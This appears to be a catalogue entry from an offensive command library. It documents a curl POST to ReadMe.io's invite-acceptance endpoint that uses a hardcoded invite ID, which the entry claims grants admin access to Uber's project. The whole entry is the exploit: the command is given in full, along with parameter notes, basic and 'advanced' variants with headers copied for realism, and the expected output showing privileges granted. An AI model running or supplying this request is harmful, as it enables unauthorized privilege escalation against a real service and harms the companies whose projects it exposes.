---
id: cmd-uuid-001
data: >-
  curl -X POST https://dash.readme.io/api/accept-invite/5617f98f7f74330d00dfd86d
  -H "Content-Length: 2" -H "Accept: application/json, text/plain, */*" -H
  "Origin: https://dash.readme.io" -H "X-XSRF-TOKEN: <your-token>" -H
  "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -H "Referer:
  https://dash.readme.io/" -H "Cookie: <your-cookies>" -d '{}'
tags:
  - api
  - exploit
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:33.876Z'
verified: false
validated: true
submitted: true
---
# readme-io-accept-invite-post

## Command

```bash
curl -X POST https://dash.readme.io/api/accept-invite/5617f98f7f74330d00dfd86d \
  -H "Content-Length: 2" \
  -H "Accept: application/json, text/plain, */*" \
  -H "Origin: https://dash.readme.io" \
  -H "X-XSRF-TOKEN: <your-token>" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" \
  -H "Referer: https://dash.readme.io/" \
  -H "Cookie: <your-cookies>" \
  -d '{}'
```

## Description

This curl command sends a POST request to the ReadMe.io invite acceptance endpoint with an empty body and specific headers to bypass validation and gain admin access to the Uber project. It exploits improper access controls by using a hardcoded invite ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://dash.readme.io/api/accept-invite/5617f98f7f74330d00dfd86d` | Target endpoint with Uber invite ID | Yes |
| `-H "X-XSRF-TOKEN: <your-token>"` | CSRF token from session | Yes |
| `-H "Cookie: <your-cookies>"` | Session cookies for authentication | Yes |
| `-d '{}'` | Empty JSON body | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://dash.readme.io/api/accept-invite/5617f98f7f74330d00dfd86d -H "X-XSRF-TOKEN: abc123" -H "Cookie: session=xyz" -d '{}'
```

### Advanced Usage

Include full headers as shown in the command for realism:

```bash
curl -X POST https://dash.readme.io/api/accept-invite/5617f98f7f74330d00dfd86d \
  -H "Content-Length: 2" \
  -H "Accept: application/json, text/plain, */*" \
  -H "Origin: https://dash.readme.io" \
  -H "X-XSRF-TOKEN: abc123" \
  -H "User-Agent: Mozilla/5.0 ..." \
  -H "Referer: https://dash.readme.io/" \
  -H "Cookie: session=xyz" \
  -d '{}'
```

## Expected Output

HTTP response body: {"error":"Invite doesn't exist"} with status 200 or 400. However, upon refreshing the dashboard, admin privileges are granted to the Uber project.

## Related

- [[Related Procedure|procedures/Exploit-Invite-Acceptance-for-Admin-Access]]
